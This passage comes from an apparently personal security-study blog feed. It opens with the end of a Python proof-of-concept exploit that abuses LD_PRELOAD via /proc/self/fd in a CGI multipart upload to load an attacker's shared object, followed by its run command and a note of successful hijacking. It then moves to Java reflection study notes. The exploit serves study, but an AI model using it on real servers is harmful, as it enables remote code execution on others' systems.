&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">boundary&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Length: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">content_length&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">--&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">boundary&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;LD_PRELOAD&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">/proc/self/fd/7
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">--&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">boundary&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;data&amp;#34;; filename=&amp;#34;1.txt&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: text/plain
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">#payload#&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">padding&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">--&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">boundary&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">--
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">encode&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;#payload#&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">client&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">client&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">20480&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">target&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload_filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">PAYLOAD_MAX_LENGTH&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;payload size must not larger than &lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">PAYLOAD_MAX_LENGTH&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">parts&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">urlparse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">port&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">port&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">scheme&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;https&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">443&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ssl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">create_default_context&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">create_connection&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hostname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">timeout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">client&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">scheme&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;https&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">wrap_socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">client&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">server_hostname&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hostname&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">ssock&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ssock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">client&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python3 poc.py http://target-ip:8080/cgi-bin/index /path/to/payload.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323003607010.png" alt="image-20220323003607010">&lt;/p>
&lt;p>成功劫持&lt;/p>
&lt;p>————由于最近也学习了CL&amp;amp;TE头的相关内容，再看到这里的实现细节感觉还挺亲切的（说明自己学的实在太少了（&lt;/p>
&lt;hr>
&lt;p>是学习笔记，有很多疏漏还请谅解（&lt;/p>
&lt;p>一直不开学，在家几个月多少有点懈怠，但是时间不等人啊，不要荒废了自己&lt;/p></description></item><item><title>Java学习笔记Ⅱ</title><link>https://amiaaaz.github.io/2022/02/28/java-study-notes-02/</link><pubDate>Mon, 28 Feb 2022 02:40:55 +0800</pubDate><guid>https://amiaaaz.github.io/2022/02/28/java-study-notes-02/</guid><description>&lt;p>并非Java开发要掌握的全部语法，我挑着来的（提前声明&lt;/p>
&lt;hr>
&lt;p>还是廖大的Java教程&lt;/p>
&lt;h2 id="反射">反射&lt;/h2>
&lt;p>反射Reflection可以在程序运行期，对某个实例一无所知的情况下 拿到一个对象的所有信息，调用其方法&lt;/p>
&lt;p>是十分强大的语言武器&lt;/p>
&lt;h3 id="class动态加载">Class&amp;amp;动态加载&lt;/h3>
&lt;ul>
&lt;li>&lt;code>class&lt;/code>由JVM在执行过程中动态加载，JVM第一次读取到一种&lt;code>class&lt;/code>类型时 将其加载入内存（不遇到不会预先加载，利用这一点可以做到运行期根据条件加载不同的实现类），每加载一种&lt;code>class&lt;/code>，JVM就为其创建一个&lt;code>Class&lt;/code>类型的实例 并与其关联起来&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// class类型: 名叫Class的class
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Class&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#75af00">Class&lt;/span>&lt;span style="color:#f92672">(){}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>以&lt;code>String&lt;/code>类为例，当JVM加载&lt;code>String&lt;/code>类时，它首先读取&lt;code>String.class&lt;/code>入内存，然后为&lt;code>String&lt;/code>类创建一个&lt;code>Class&lt;/code>实例并关联起来&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个&lt;code>Class&lt;/code>实例的构造方法为&lt;code>private&lt;/code>，只有JVM可以创建&lt;/p>
&lt;ul>
&lt;li>JVM持有的每个&lt;code>Class&lt;/code>实例都指向一个数据类型(class or interface)&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227104610572.png" alt="image-20220227104610572">&lt;/p>
&lt;ul>
&lt;li>一个&lt;code>Class&lt;/code>实例包含了该&lt;code>class&lt;/code>的所有信息，所以如果获取了某个&lt;code>Class&lt;/code>实例，我们就可以通过这个&lt;code>Class&lt;/code>实例获取到该实例对应的&lt;code>class&lt;/code>的所有信息，这就叫反射Reflection&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227104646646.png" alt="image-20220227104646646">&lt;/p>
&lt;ul>
&lt;li>获取一个&lt;code>class&lt;/code>的&lt;code>Class&lt;/code>实例的三种方法&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 通过一个class的静态变量class获取
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 已经加载某个类 获取它的java.lang.Class对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 通过实例变量的getClass方法获取
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 上下文已存在某个类的实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 通过静态方法Class.forName获取
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 前提是知道class的完整类名
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.String&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>因为&lt;code>Class&lt;/code>实例在JVM中是唯一的，所以上述方法获取的&lt;code>Class&lt;/code>实例是同一个实例，可以用&lt;code>==&lt;/code>比较&lt;/li>
&lt;li>一般应该用&lt;code>instanceof&lt;/code>判断数据类型，不但匹配指定类型，还匹配指定类型的子类；而用&lt;code>==&lt;/code>判断&lt;code>class&lt;/code>实例可以精确地判断数据类型，但不能作子类型比较&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true，因为n是Integer类型
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true，因为n是Number类型的子类
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true，因为n.getClass()返回Integer.class
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// false，因为Integer.class!=Number.class
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>通过反射获取实例的基本信息的小栗子&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 注
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runnable&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Month&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
